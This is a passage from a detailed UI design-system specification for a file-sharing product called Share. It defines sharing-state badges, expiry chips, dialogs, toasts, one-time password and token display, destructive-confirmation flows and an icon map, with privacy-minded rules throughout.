#### 13.6.8.3 Anatomy

```
┌──────────────────────────────────────────────────────────────────┐
│ [🔒 Private]                                                     │  private
│ [👥 Shared with 3 people]                                        │  granted
│ [🔗 Link active] [🔑 Password] [⏱ Expires 7 Sep 2026, 18:04]     │  link, protected
│ [🔗 Link active] [⏱ Expires 26 Aug 2026, 09:00]                  │  link, expiring soon
│ [❓ Unknown]                                                      │  unknown
└──────────────────────────────────────────────────────────────────┘
   state badge        password chip        expiry chip
   (always)           (only with a link)   (only with a link)
```

The **state badge** is the component. The **password chip** and **expiry chip** are siblings
rendered by the same wrapper, in that fixed order, with a 6px gap. The wrapper is a single
`<span role="group">` whose `aria-label` carries the whole fact as one sentence:

```
aria-label="Sharing: link active, password protected, expires 7 September 2026 at 18:04 BST.
            Also shared with 3 people."
```

The wrapper **never wraps to a second line inside a table cell**. Under width pressure it drops
the password chip first and the expiry chip second — **never the state badge** — and every
dropped fact remains in the `aria-label`, in the row's `⋯` menu, and on the artifact's detail
screen.

#### 13.6.8.4 Trashed artifacts

An artifact in the trash renders `--state-trashed-*` with the `trash-2` icon and the label
`In trash`, **replacing the state badge entirely** rather than sitting beside it. This is
correct because §7.10 makes a trashed artifact unshareable (`422 artifact_trashed`), every live
link on it is revoked at delete time, and its previous state is no longer a fact about the
present. The trash screen (11.15) shows a `restore-until` date beside it, not an expiry chip.

#### 13.6.8.5 Sizes and variants

| Size | Badge height | Icon | Text | Where |
| --- | --- | --- | --- | --- |
| `sm` | 20px | 12px | `--type-xs` | Table cells, command-palette results, audit rows, the viewer bar, compact lists |
| `md` | 24px | 14px | `--type-xs` | Card corners, drawer headers, dialog bodies, stacked rows |
| `lg` | 28px | 16px | `--type-sm` weight 500 | The artifact detail page header (11.7) only |

| Variant | Rule |
| --- | --- |
| `subtle` | The default. Every table, card, list, menu, and toast. |
| `solid` | Exactly two places: the artifact detail page header (11.7) at `lg`, and the result state in the create-link dialog (11.13) after the link exists. It exists so that the one screen dedicated to a single artifact states its sharing with maximum force. |
| `dot` | An 8px `--radius-full` dot in `--{family}-solid`, no visible label. Permitted only where a labelled badge cannot fit **and** the same fact appears as text in the same row — currently only the collapsed sidebar's pinned-artifact rail and the compact-density command-palette result list. Requires an `aria-label` and a tooltip. Nowhere else, ever. |

#### 13.6.8.6 Placement

| Surface | Position | Size / variant |
| --- | --- | --- |
| 11.5 Artifact list | Column 2, always present, never drops | `sm` / `subtle` |
| 11.5 Expiring-soon banner | Inline in the banner body, per listed artifact | `sm` / `subtle` |
| 11.6 Empty state / first run | Not shown — there are no artifacts yet | — |
| 11.7 Artifact detail header | Immediately right of the `--type-h1` monospace name, 12px gap, optically centred to the title's cap height | `lg` / `solid` |
| 11.8 Files tab toolbar | Right-aligned, beside the download-all button | `sm` / `subtle` |
| 11.9 Viewer bar | Centre of the bar | `sm` / `subtle` |
| 11.10 Versions tab | Header only, never per version — versions do not have sharing states, the artifact does | `sm` / `subtle` |
| 11.11 Version preview | Header, with an `info` banner noting that links always serve the current version (§7.2) | `sm` / `subtle` |
| 11.12 Sharing panel | At the top of the panel, above the links section | `md` / `subtle` |
| 11.13 Create-link dialog | Twice: the current state at the top of the body, and the resulting state in the success footer | `md` / `subtle`, then `md` / `solid` |
| 11.14 Shared with me | Per row, showing the state **as the grantee sees it**: always `granted`, with the owner's handle beside it | `sm` / `subtle` |
| 11.15 Trash | Per row, always the `In trash` treatment (§13.6.8.4) | `sm` / `subtle` |
| 11.16 Search and command palette | Trailing edge of each artifact result | `sm` / `subtle` |
| 11.23 Audit log | On rows whose event is `link.create`, `link.revoke`, `link.expired`, `grant.create`, `grant.revoke`, showing the **resulting** state | `sm` / `subtle` |
| 11.24 Staleness | Per row | `sm` / `subtle` |
| Toasts | In the toast body whenever the toast reports a sharing change | `sm` / `subtle` |

It never appears inside a dropdown menu item, inside a tooltip as the sole carrier of the fact,
inside a breadcrumb, or on any recipient-facing page (R1–R7) — a recipient must learn nothing
about how else an artifact is shared (§7.6).

#### 13.6.8.7 Behaviour

- **Not interactive.** Not a button, not a link, no `cursor: pointer`; clicking it does nothing.
  The action lives in a nearby button whose label is a verb ("Create link", "Revoke link",
  "Share with a user").
- **On change**, the badge cross-fades over 180ms and its row or header flashes `--bg-selected`
  for 600ms. Under `prefers-reduced-motion: reduce` the flash becomes a 2px left border in
  `--focus-ring-color` held for 3 seconds.
- **Announcement.** `role="status"` with `aria-live="polite"` *only* on the screens where the
  user has just made the change themselves — 11.12, 11.13, and the 11.7 header. In tables it is
  static, so a background refresh never spams a screen reader.
- **Print.** `@media print` forces `subtle`, keeps the 1px border, renders the icon as a real
  inline SVG rather than a background image, and prints the tint as a light grey when the
  printer is monochrome. A printed artifact list must still distinguish the four states without
  colour, which it does through icon and word.
- **Screenshot resilience.** Because the label is always present, a screenshot of any row pasted
  into a chat window carries the complete fact with no legend. This is the actual reason the
  word is never dropped.

### 13.6.9 Expiry chip

Rendered only when the state is `link`. Never on `private`, `granted`, `unknown`, or `In trash`.

| Condition | Family | Icon | Text |
| --- | --- | --- | --- |
| More than 48h remaining | `--share-unknown-*` (neutral) | `timer` | `Expires 7 Sep 2026, 18:04` |
| 48h or less remaining | `--state-expiring-*` | `timer` | `Expires 26 Aug 2026, 09:00` |
| Past expiry, pre-sweep (§7.5) | `--state-expired-*`, 1px **dashed** border | `timer-off` | `Expired 24 Aug 2026, 09:00` |
| Several links with different expiries | neutral, or expiring if any is within 48h | `timer` | The **soonest** expiry, with `+2 more` as an `outline` badge |

The neutral treatment above 48 hours is deliberate. A link with 60 days left is not an alarm,
and colouring every expiry orange would destroy the signal that matters — which is that
something is about to stop working, or has.

The chip text is **always the absolute datetime** (§13.9.2). The relative form ("in 6 days")
lives only in the tooltip and the `aria-label`, never in the chip, because a chip gets
screenshotted and a relative time does not survive being moved through time.

There is no `No expiry` variant, no infinity icon, and no code path that renders one. Every link
has a non-null expiry by P4; a UI capable of drawing a permanent link implies one can exist.

### 13.6.10 Table

Container: `--bg-surface`, 1px `--border-default`, `--radius-lg`, `overflow: hidden`, with an
inner `overflow-x: auto` region so a wide table scrolls inside its own card and the page body
never scrolls horizontally.

Header row 36px, `--bg-surface`, 1px `--border-default` bottom, sticky within the scroll
container and gaining `--shadow-sm` once scrolled. Cells `--type-xs` weight 500
`--text-tertiary`, sentence case. Sortable headers carry a trailing 12px `chevron-up` /
`chevron-down` plus `aria-sort`; an unsorted header shows its chevron at 40% opacity on hover
only.

Body cells: padding-inline 12px (16px on the first and last), vertically centred, `--type-body`,
1px `--border-subtle` bottom except on the last row.

Selection: a 40px leading checkbox column on tables that support bulk actions (artifacts,
versions, tokens, trash). Selecting swaps the toolbar for a selection toolbar reading
`3 selected`. **Bulk revoke is permitted; bulk link creation is not** — widening happens one
artifact at a time (D5), so there is no multi-select path to a share link anywhere in the
product.

Loading renders the header plus five skeleton rows at the current density, with each row's
sharing-state cell rendering `unknown` rather than a skeleton (§13.6.8.2). Empty keeps the
container border and centres the empty state (§13.6.23) with 48px of vertical padding.

### 13.6.11 Card

`--bg-surface`, 1px `--border-default`, `--radius-lg`, padding 16px — 24px when the card is a
page section. Optional header: `--type-h3` title, optional `--type-sm` `--text-tertiary`
description, optional right-aligned action, separated from the body by 16px or by a full-bleed
1px `--border-subtle` rule when the body is a list or a table.

Interactive cards (artifact cards on narrow viewports) gain `cursor: pointer`, hover
`--bg-hover` plus `--border-strong`, and a focus ring on the card itself. They do not lift,
scale, or gain a shadow.

**Stat tile** (11.25 storage, 11.7 view counts): 16px padding, `--type-xs` `--text-tertiary`
label, `--type-display` value with `tabular-nums`, optional `--type-sm` delta. Deltas never
animate and values never count up.

**Link card** (11.12): the one card variant carrying state colour. A 3px left border in
`--share-link-solid` when the link is live, `--state-expiring-solid` within 48 hours, and
`--state-expired-border` (dashed) once expired. Body: the share URL in a copy field, the label,
the expiry chip, the password chip if set, the view count, and a `secondary` Revoke button. The
token itself is shown truncated (§13.9.6) and the copy control copies it whole.

### 13.6.12 Tabs

Underline tabs, never pills. A 36px row with a full-width 1px `--border-subtle` bottom border.
Tab: padding-inline 12px, `--type-body` weight 500, `--text-secondary`; hover `--text-primary`;
selected `--text-primary` with a 2px `--neutral-solid` bar flush to the bottom border. An
optional trailing count is an `outline` badge.

Tabs are peer views of one object — Overview, Files, Versions, Sharing — never navigation
between unrelated screens, never nested, and always reflected in the URL so a tab is linkable
and survives a reload. Below 768px the row scrolls horizontally with 24px edge fades, scroll
snapping per tab, and the selected tab scrolled into view on mount.

### 13.6.13 Dialog

Overlay `--bg-overlay` at `--z-overlay`. Panel: `--bg-raised`, `--radius-xl`, `--shadow-lg`,
`--z-dialog`, centred, `width: min(560px, calc(100vw - 32px))`,
`max-height: calc(100vh - 96px)` with the body scrolling and the header and footer pinned.

| Region | Spec |
| --- | --- |
| Header | 24px padding, `--type-h2` title, optional `--type-sm` `--text-tertiary` description, a 32px ghost `x` at top-right |
| Body | 24px padding-inline, 0 top (the header supplies it), 24px bottom when there is no footer |
| Footer | 24px padding, 1px top `--border-subtle` when the body scrolls, actions right-aligned with an 8px gap, secondary before primary |

Widths: `sm` 400px (confirmations), `md` 560px (default, create-link), `lg` 720px (version
compare, file preview in a dialog).

Behaviour: focus trapped; initial focus on the first interactive element, or on the text input
in a destructive dialog; `Escape` closes unless a submit is in flight; overlay click closes
**only** non-destructive, non-widening dialogs; body scroll locked; `aria-modal="true"` with
`aria-labelledby` pointing at the title. Two dialogs are never open at once — a second step
replaces the first dialog's body, as the create-link dialog does when it moves from form to
result.

### 13.6.14 Drawer

Right-anchored, `width: min(480px, 100vw)`, full height, `--bg-raised`, `--shadow-lg`,
`--radius-xl` on the leading corners only, `--z-drawer`, with the same overlay as a dialog.
Header, body, and footer are identical to Dialog. Below 640px it becomes a 90vh bottom sheet
with `--radius-xl` top corners and a 32×4px `--border-strong` grab handle.

Drawers inspect a row without losing the table: audit event detail (11.23), session detail
(11.19), file entry detail (11.8), version detail (11.10). **Dialogs are for acts.** If the
panel's purpose is a decision, it is a dialog; if its purpose is to look at something, it is a
drawer.

### 13.6.15 Dropdown menu

Surface `--bg-raised`, 1px `--border-default`, `--radius-lg`, `--shadow-md`, `--z-dropdown`,
4px padding, `min-width: 180px`, `max-width: 320px`, `max-height: 400px` then scrolling.
Aligned to the trigger's edge with a 4px offset, flipping on collision.

Items: 32px, padding-inline 8px, `--radius-md`, `--type-body` `--text-primary`, optional 16px
leading icon in `--text-tertiary` with an 8px gap, optional trailing `--type-xs`
`--text-tertiary` shortcut hint. Hover and keyboard highlight are both `--bg-hover`; there is no
separate focus ring inside a menu. Destructive items use `danger-ghost` colours below a 1px
`--border-subtle` divider with 4px margin. Section labels: `--type-xs` weight 500
`--text-tertiary`, 24px, not interactive. Checkable items reserve a 16px leading slot for a
`check`.

A row's `⋯` menu on 11.5 carries, in order: Open, Copy URL, Create link, Manage sharing,
Download, Copy to my space (grantee rows only), a divider, then Move to trash in
`danger-ghost`. **The sharing-state indicator never appears inside a menu item** — a menu is a
list of verbs.

### 13.6.16 Banner / callout

A full-width block inside the content region: `--radius-lg`, 1px `--{family}-border`, background
`--{family}-bg`, padding 12px 16px, with a 3px left border in `--{family}-solid`.

Anatomy: `[16px icon in --{family}-fg] [title (--type-body, 500, --text-primary) + body (--type-body-lg, --text-secondary)] [actions] [optional dismiss x]`

| Variant | Family | Icon | Use |
| --- | --- | --- | --- |
| `info` | `--state-info-*` | `info` | Neutral context: "Links always serve the current version", the grantee notice on 11.14, the version-preview notice on 11.11. |
| `success` | `--state-success-*` | `circle-check` | Rare. The completion of a multi-step flow — passkey registered, instance restored. |
| `warning` | `--state-warning-*` | `triangle-alert` | Every `warnings[]` code from §12.6, the expiring-soon banner on 11.5, the "this token can create share links" notice on 11.18, the over-80%-quota notice on 11.25. |
| `danger` | `--state-danger-*` | `octagon-alert` | Form-level errors, quota exceeded, a failed upload, the danger-zone header on 11.21. |

Only `info` and `success` banners are dismissible; `warning` and `danger` persist until their
cause is resolved. Dismissal is remembered per banner id in `localStorage`, never across
accounts.

**The expiring-soon banner (11.5) is never dismissible.** It lists every artifact with a link
expiring within 48 hours, each row carrying the artifact name in monospace, its sharing-state
indicator at `sm`, the absolute expiry, and an Extend action. It is the one banner allowed to
appear above the page header rather than below it.

### 13.6.17 Toast

Bottom-right stack — bottom-centre below 640px — 16px from the viewport edge, 8px gap,
`--z-toast`, at most 3 visible with older ones collapsing into `+2 more`. Panel: `--bg-raised`,
1px `--border-default`, `--radius-lg`, `--shadow-md`, padding 12px 14px,
`width: min(400px, calc(100vw - 32px))`.

Anatomy: `[16px status icon] [title (--type-body, 500) + optional body (--type-sm, --text-tertiary)] [optional action link] [12px x]`.
The icon takes the semantic family's colour; the panel background does **not** — toasts are
always `--bg-raised`, with `danger` alone adding a 3px `--state-danger-solid` left border.

Durations: success 4s, info 5s, warning 7s, danger **never auto-dismisses**. Hover or focus
pauses the timer. A toast reporting a sharing change carries the sharing-state indicator in its
body and lasts 7s in either direction.

Toasts confirm; they never carry information available nowhere else. **A toast never carries a
share URL, a share token, or a generated password** — those go into a dialog with a copy control
and the shown-once treatment (§13.6.20.3), because a toast disappears and these values cannot be
retrieved again.

Revoking a link shows a toast with a 10-second `Undo` action, which re-creates a link with the
same TTL and label but **a new token**, and the toast body says so: "A new link was created. The
old URL stays dead."

### 13.6.18 File tree

A 240px panel, `--bg-surface`, 1px right border `--border-subtle`, `overflow: auto`. Used on the
files tab (11.8), in the viewer for bundles (11.9), and on R7.

Rows: 28px, padding-inline 8px, 16px indent per depth level applied as `padding-left` so the hit
area spans the full width. Anatomy:
`[12px chevron-right / chevron-down, folders only] [16px kind icon] [name]`, gaps 4px then 6px.
The name is `--type-mono-sm` `--text-primary`, middle-truncated in code (§13.9.6) with the full
path in a `title`. Folders sort before files, then case-insensitive lexical.

The entry-point file (`entryPath`, §5.5) carries a trailing 12px `corner-down-right` icon in
`--text-tertiary` and the tooltip "Served at the artifact root", so it is obvious which file
answers when someone opens the bare URL.

States: hover `--bg-hover`; selected `--bg-selected` with a 2px inset left bar in `--text-link`;
inset focus ring. Full `tree` role with roving `tabindex`, arrow-key navigation (`Left`
collapses or moves to the parent, `Right` expands or moves to the first child), and prefix
type-ahead. Expansion state persists per artifact in `sessionStorage`. Trees over 1,000 nodes
virtualise and show a `--type-sm` `--text-tertiary` footer with the total count and total size.

### 13.6.19 Code block

Container: `--bg-sunken`, 1px `--border-subtle`, `--radius-sm`, `overflow-x: auto`. Content
`--type-mono-code`, `--text-primary`, padding 12px 14px, `tab-size: 2`.

Optional header bar: 32px, `--bg-surface`, 1px `--border-subtle` bottom, with a `--type-xs`
`--text-tertiary` filename or language label at the left and a copy control at the right.

Optional line numbers: `--text-disabled`, `--type-mono-sm`, right-aligned in a 40px gutter with
a 1px `--border-subtle` edge and `user-select: none`, so a copy never picks them up.

Syntax highlighting uses these token colours and no others, in both themes: keyword
`--chart-4`, string `--chart-6`, number `--chart-3`, comment `--text-tertiary`, function
`--chart-1`, punctuation `--text-secondary`. It applies to help-page snippets and the file
viewer only, never to audit output, which stays monochrome.

The agent-setup page (11.27) is the heaviest user of this component: the MCP endpoint block, the
`share post` CLI example, and the `curl` example. Each carries a copy control, and **each
renders any token as the literal placeholder `shr_YOUR_TOKEN`** — a real token is never
interpolated into a sample a screenshot might capture.

Inline code: `--font-mono` at 0.92em of the surrounding size, `--bg-sunken`, 1px
`--border-subtle`, `--radius-xs`, padding 1px 4px.

### 13.6.20 Copy-to-clipboard control

Two ordinary forms and one special one. All three are mandatory wherever an identifier is
displayed.

#### 13.6.20.1 Icon button

A 24px ghost button with a 14px `copy` icon in `--text-tertiary`, hover `--text-primary` plus
`--bg-hover`. On success the icon swaps to `check` in `--state-success-fg` for 1,600ms, and
`aria-live="polite"` announces "Copied". **No toast** — a toast for a copy is noise.

#### 13.6.20.2 Copy field

A read-only Input holding the value in `--font-mono`, with the copy icon button inside its
trailing edge. Used for share URLs, artifact URLs, API tokens, and recovery codes. Clicking
anywhere in the field selects the whole value.

Rules for both forms: the control always copies the **full, untruncated** value even when the
display is abbreviated (§13.9.6); its `aria-label` names what is copied — "Copy share URL", not
"Copy"; and when `navigator.clipboard` is unavailable it falls back to selecting the text and
showing the platform shortcut in a tooltip rather than disappearing.

#### 13.6.20.3 The "shown once" treatment

Three values in this product are returned exactly once and can never be retrieved again: a
**generated link password** (§7.3), an **API token** on creation (§4), and a **recovery code**
(§4.5). They get a distinct, deliberately heavier treatment, and the treatment is identical in
all three places.

```
┌────────────────────────────────────────────────────────────┐
│  🔑  Password — shown once                                 │  --type-h3 + 16px key-round
│                                                            │
│  ┌──────────────────────────────────────────────┐          │
│  │  civil-marmot-71                        [⧉]  │          │  --type-mono-lg, 48px tall
│  └──────────────────────────────────────────────┘          │
│                                                            │
│  ⚠  This is the only time this password is shown.          │  warning banner, not dismissible
│     Copy it now. If you lose it, create a new link.        │
│                                                            │
│  ☐  I have copied the password                             │  checkbox gating the close
└────────────────────────────────────────────────────────────┘
```

| Rule | Detail |
| --- | --- |
| Field | 48px tall (not 32px), `--type-mono-lg`, `--bg-sunken`, 1px `--border-strong`, `--radius-md`, value selectable, whole value selected on click. |
| Banner | A non-dismissible `warning` banner **inside** the dialog body, above the acknowledgement. |
| Acknowledgement | A checkbox labelled "I have copied the password" / "…the token" / "…the recovery code". The dialog's close button and its `x` are **disabled until it is ticked**. `Escape` is also suppressed. This is the only dialog in the product that traps the user, and it does so because closing it destroys information. |
| After close | The value is removed from the client store, not merely hidden. Re-opening the artifact shows `Password set` with no value and no reveal affordance, because the server cannot produce it either (§7.4). |
| Never | Not in a toast, not in a URL, not in a `title` attribute, not in the page title, not in an `aria-live` announcement of the raw characters, and not written to `localStorage` or `sessionStorage`. |
| Copy button | Copies the value and swaps to `check`, but does **not** tick the acknowledgement — the user confirms they have it somewhere, and a clipboard is not somewhere. |

The share URL itself is not shown-once — it is retrievable from the sharing panel for the life
of the link — so it uses an ordinary copy field. Only the password is one-time. The create-link
dialog therefore shows both, adjacent, with the URL above and the password in the shown-once
block below, and the copy control on each labelled distinctly ("Copy share URL", "Copy
password") so a screen-reader user never has to guess which one they just copied.

### 13.6.21 Breadcrumb

`--type-sm` `--text-tertiary`, separated by a 14px `chevron-right` in `--text-disabled` with 6px
gaps. Path segments and artifact names render in `--type-mono-sm` — the monospace rule applies
here too. The last segment is `--text-primary`, not a link, and carries `aria-current="page"`.
Links underline on hover only.

Breadcrumbs never wrap. When the trail overflows, middle segments collapse into a `⋯` ghost
button opening a dropdown; the first segment and the last two always survive.

Used in the file browser (11.8), the viewer for nested bundle paths (11.9), R7, and the help
pages (11.27). The artifact detail screen uses the sidebar plus a page title instead.

### 13.6.22 Tag chip

Tags are the only user-supplied metadata this product stores about an artifact besides the title
and description, and search leans on them (§8.5), so they get real affordance rather than being
buried.

A chip at 24px, `--radius-sm`, `--bg-sunken`, 1px `--border-default`, `--type-xs` weight 500
`--text-secondary`, with a 12px `tag` icon and a 6px gap. **Tag labels are proportional, not
monospace** — a tag is a word, not an identifier.

| Context | Behaviour |
| --- | --- |
| Read-only (table cell, detail header) | Up to 3 chips, then an `outline` `+2` badge whose tooltip lists the rest. |
| Filter (11.5 toolbar, 11.16) | Clickable. Active filters gain `--bg-selected` and 1px `--border-focus`, and carry a trailing 12px `x` in a 16px hit area. |
| Editing (11.7, 11.17) | A token input: chips inside a field, `Enter` or `,` commits, `Backspace` on an empty input removes the last chip, and a combobox suggests existing tags. The §3 constraint (lowercase, digits, space, hyphen, underscore, ≤40 chars, ≤20 tags) is enforced live, with a `--type-sm` error beneath rather than silent truncation. |

Tags never carry semantic colour and are never auto-assigned — nothing in this product infers a
tag from content (P5).

### 13.6.23 Empty state

A centred column, `max-width: 420px`, 48px vertical padding, 12px gaps.

Anatomy: `[32px icon inside a 56px --bg-sunken --radius-full circle, icon in --text-tertiary]`,
`[heading --type-h3 --text-primary]`, `[body --type-sm --text-tertiary, at most 2 sentences]`,
`[one primary action]`, `[optional --type-sm link into 11.27]`.

No illustrations. The icon is the concept's own icon from §13.7 — `package` for an empty
artifact list, `users` for an empty Shared-with-me, `trash-2` for an empty trash, `scroll-text`
for an empty audit log, `link-2` for an artifact with no share links.

Three cases, never conflated:

| Case | Treatment |
| --- | --- |
| **Nothing yet** | The full empty state with a primary action. Copy from §12.5. On 11.6 this becomes the first-run checklist instead. |
| **Nothing matches the filter** | A compact variant: no icon circle, `--type-sm` text, and a ghost "Clear filters" button. |
| **Failed to load** | A `danger` banner inside the container plus a "Try again" `secondary` button. **Never the empty state** — "you have no artifacts" and "we could not fetch your artifacts" must never look alike, because the first is calm and the second means something is wrong. |

### 13.6.24 Skeleton

`--bg-sunken` blocks at `--radius-sm`, sized to the real content's box so nothing shifts when
data arrives. Text skeletons are 12px tall for `--type-sm` and 14px for `--type-body`, with a
paragraph's last line at 60% width. A shimmer sweeps left to right over 1,400ms as a
`background-position` animation on a 200%-wide `--bg-sunken → --bg-hover → --bg-sunken` gradient.

Skeletons appear only after 200ms of loading — a faster response shows nothing, avoiding a
flash — cap at 5 rows in tables, and are **never used for the sharing-state indicator**
(§13.6.8.2) or for a kind thumbnail, which renders its placeholder immediately. Under
`prefers-reduced-motion: reduce` the shimmer is dropped for a flat `--bg-sunken`.

### 13.6.25 Progress bar

Track 4px tall (6px in dialogs), `--bg-sunken`, `--radius-full`. Fill `--neutral-solid`,
`--radius-full`, `transition: width 240ms var(--ease-standard)`.

**Determinate** for uploads (11.17): the value is bytes uploaded over bytes to upload across the
whole post, with a `--type-sm` `--text-tertiary` caption beneath —
`14 of 47 files · 8.2 MB of 24 MB` — and `role="progressbar"` with `aria-valuenow` /
`aria-valuemin` / `aria-valuemax`.

**Indeterminate** is a 30%-wide fill sweeping the track over 1,200ms, used only for steps with
no measurable progress (bundle expansion, hashing). Under reduced motion it becomes a static 30%
fill with the state named in the caption.

A 2px page-level indeterminate bar under the top bar marks route transitions over 300ms, in
`--text-link` rather than `--neutral-solid`, so navigation reads differently from work.

**Quota meter** (11.25, and the sidebar foot at ≥90%): the same track at 8px, fill
`--neutral-solid` below 80%, `--state-warning-solid` at 80–94%, `--state-danger-solid` at ≥95%,
with the caption `412 GB of 500 GB used · 88%`. The colour change is accompanied by a matching
banner, never by colour alone.

### 13.6.26 Pagination (cursor-based)

Share's list endpoints are cursor-paginated (§5.7). **There are no page numbers, no "page 3 of
12", no jump-to-page, and no total-page count anywhere in the product**, because the API cannot
produce them without a count query this instance does not run.

Two forms:

**Load more** — the default for tables and lists. A full-width `secondary` `--control-md` button
beneath the table labelled `Load more`, with a `--type-sm` `--text-tertiary` caption above it:
`Showing 50 artifacts`. Loading swaps the label for a spinner and `Loading…`. When the cursor is
exhausted the button becomes a `--type-sm` `--text-tertiary` line: `End of list · 137 artifacts`.
New rows append with no scroll jump and no entrance animation.

**Newer / Older** — for timelines where position matters: the audit log (11.23) and the view
history on 11.7. A right-aligned pair of `secondary` `sm` buttons, `[chevron-left] Newer` and
`Older [chevron-right]`, with the window's range between them at `--type-sm` `--text-tertiary`
(`24 Aug, 09:00 – 24 Aug, 15:04`). Each is disabled when its cursor is null.

Page size is 50 and is not user-configurable. Cursors live in the URL query string, so a
paginated view is linkable and survives a reload.

### 13.6.27 Destructive-confirmation dialog

A `sm` (400px) dialog variant used for every irreversible act.

```
┌──────────────────────────────────────────────┐
│ ⚠  Delete this artifact permanently?      ✕  │  header: 16px octagon-alert in
│                                              │  --state-danger-fg + --type-h2
│  This removes postcal, its 6 versions, and   │  body: --type-body, names the
│  its files. Anyone holding a link to it will │  object and the consequence,
│  get "not found" immediately. This cannot be │  at most 3 sentences
│  undone.                                     │
│                                              │
│  Type the artifact name to confirm           │  label --type-sm
│  ┌────────────────────────────────────────┐  │
│  │ postcal                                │  │  monospace Input
│  └────────────────────────────────────────┘  │
│                                              │
│                 [ Cancel ] [ Delete forever ]│  footer: secondary + danger
└──────────────────────────────────────────────┘
```

| Rule | Detail |
| --- | --- |
| Typed confirmation | Required for: permanently deleting an artifact from the trash, emptying the trash, deleting a version, revoking every API token at once, removing a user, and deleting an account. The user types the object's **name or handle** exactly — case-sensitive, whitespace-trimmed. Paste is allowed. |
| Confirm button | `danger` variant, disabled until the typed value matches exactly, labelled with a verb plus the object noun (`Delete forever`, `Empty trash`, `Remove user`). Never `Confirm`, `OK`, or `Yes`. |
| Cancel | `secondary`, listed first, always focusable. The text input takes initial focus so the flow is deliberate without being obstructive. |
| Escape / overlay | `Escape` closes. The overlay does **not** close on click. |
| Consequence sentence | Mandatory, and it must name what stops working for other people. For anything with live links, it says so explicitly and states the number: "2 live links will stop working." |
| What does NOT use this | **Moving an artifact to the trash** — reversible for 30 days, so it is one click with an undo toast. **Revoking a link** — one click, no dialog, undo toast (§13.6.17). **Revoking a grant** — one click. Narrowing access is never obstructed (D5). |

The create-link dialog (11.13) is this dialog's mirror image: the same weight, the opposite
colour. A `warning` banner naming what a link means, a required TTL select defaulting to 14
days, a password choice, an optional label, and a footer showing the resulting sharing-state
indicator in `solid` beside the share URL. Confirm is `primary`, labelled `Create link`.

### 13.6.28 Artifact thumbnail and kind placeholder

**Share never opens an artifact's files** (P5, G8). There is no thumbnailing, no first-page
render, no video poster frame, no image downscale, and no colour extraction. Every artifact is
represented by its **kind icon** on a neutral tile, and nothing else. This is a privacy
guarantee expressed as a design decision, and no future "just for images" exception is
permitted — the moment one kind gets a content-derived preview, the guarantee is gone and the
UI stops being a truthful description of what the server does.

Tile: square, `--radius-sm`, `--bg-sunken`, 1px `--border-subtle`, with the kind icon centred in
`--text-tertiary`. Sizes 20px (compact rows, icon 12px), 32px (default table rows, icon 16px),
48px (stacked-row cards and the 11.7 header, icon 24px), 64px (the viewer's `file` fallback,
icon 32px).

| Kind | Icon | Tile note |
| --- | --- | --- |
| `bundle` | `folder-open` | The only kind whose tile carries a `--type-2xs` file count at the bottom-right, e.g. `4` |
| `page` | `file-code-2` | |
| `document` | `file-text` | |
| `image` | `image` | |
| `video` | `file-video` | |
| `file` | `file` | The fallback; also used when `kind` is missing |

The tile never carries state colour, never animates, and is never a link on its own — the row or
card around it is the target. On R2 the same tile appears at 64px above the download button,
because the recipient also has no preview, for the same reason.

### 13.6.29 Avatar

Square at `--radius-full`, sizes 20 / 24 / 32 / 40px. The content is 1–2 initials at `--type-xs`
weight 500 (≤24px) or `--type-sm` weight 500 (above), on a tint derived by hashing the user id
into one of the six `--chart-*` families, with the text in the matching foreground. Never a
gradient, never a photograph — Share stores no avatars and fetches no Gravatar, which would be
an outbound request describing who uses this instance.

Non-human actors render an icon instead of initials, which matters most in the audit log where
distinguishing "the owner did this" from "an agent token did this" from "the expiry sweep did
this" is the whole point:

| Actor | Icon |
| --- | --- |
| API token (`actor_type='token'`) | `key-square` |
| System (`actor_type='system'`) | `server-cog` |
| Recipient via a share link | `link-2` |

Groups overlap by 8px with a 2px `--bg-surface` ring on each, capped at 4 plus a `+3` counter
chip. Used on the grants list (11.12) and the users screen (11.22).

### 13.6.30 Tooltip

`--neutral-solid` background, `--neutral-solid-text` text, `--type-xs`, padding 6px 8px,
`--radius-md`, `--shadow-md`, `max-width: 280px`, `--z-tooltip`. No arrow. Offset 6px from the
trigger, flipping on collision.

Delay: 400ms to open on hover, 0ms on keyboard focus, 100ms to close. Grouped triggers share a
150ms skip-delay so moving along a toolbar does not re-wait.

Tooltips are **never interactive** and contain no links or buttons. They never carry information
available nowhere else (D4) — an icon-only button's tooltip duplicates its `aria-label`, it does
not extend it. Attached with `aria-describedby`. Coarse pointers get no tooltips at all, so
every icon-only control must be reachable another way there.

The one permitted content extension is the relative-time hint on an absolute timestamp
(§13.9.2), because the absolute form is present in the DOM and the tooltip only restates it in a
second form.

---

## 13.7 Iconography

**Set: [Lucide](https://lucide.dev), version 0.4x, ISC licence.** Consumed as `lucide-react`
with per-icon imports so the bundle carries only what is used. Chosen for its consistent 24×24
stroke grid, a licence permitting redistribution with no in-UI attribution, and coverage of
every concept below without a single custom drawing. Recipient-facing pages inline the two or
three SVG paths they need directly into the template (§13.11.4) rather than loading the library.

| Property | Value |
| --- | --- |
| Grid | 24×24 viewBox, always |
| Rendered sizes | 12px (badges, chips, tree chevrons), 14px (inline with `--type-sm`, copy controls), **16px (default** — buttons, menu items, inputs, table cells), 20px (page-header actions, banner icons), 24px (48px thumbnails), 32px (empty states, 64px thumbnails) |
| Stroke width | `2` at 12–14px, **`1.75` at 16–20px**, `1.5` at 24–32px. Set explicitly per size; never left at the library default across every size. |
| Colour | `currentColor`, always. An icon never carries its own hex value. |
| Caps / joins | `round` / `round` — the Lucide default, unchanged |
| Alignment | Optically centred. Icons in a text row use `flex-shrink: 0` and `vertical-align: -0.125em` when inline. |
| Accessibility | `aria-hidden="true"` whenever a text label is adjacent. An icon-only control carries `aria-label` on the **control**, not on the icon. |

No other icon set may be introduced. The only non-Lucide SVG in the product is the Share
wordmark in `/assets/brand/`.

### 13.7.1 Concept → icon map

| Concept | Lucide icon | Notes |
| --- | --- | --- |
| **private** (state) | `lock` | Also the icon of the *revoke everything* action — the verb wears the state it produces. |
| **shared with people** (state) | `users` | Plural, always. A single grant still uses `users`, never `user`, so the state icon is stable at every count. |
| **link active** (state) | `link-2` | Never `globe`, never `share-2`. `globe` would imply the artifact is on the open internet; it is not, it is behind a 128-bit capability. |
| **unknown** (state) | `circle-help` | Only ever in `--share-unknown-*`. |
| **expiring soon** | `timer` | The same icon above and below 48h; only the colour family changes. |
| **expired** | `timer-off` | Also the R3 page's single icon. |
| **password** | `key-round` | The link modifier chip, the R1 gate, and the shown-once password block. |
| **artifact** (generic) | `package` | The object. Sidebar, empty states, search results. |
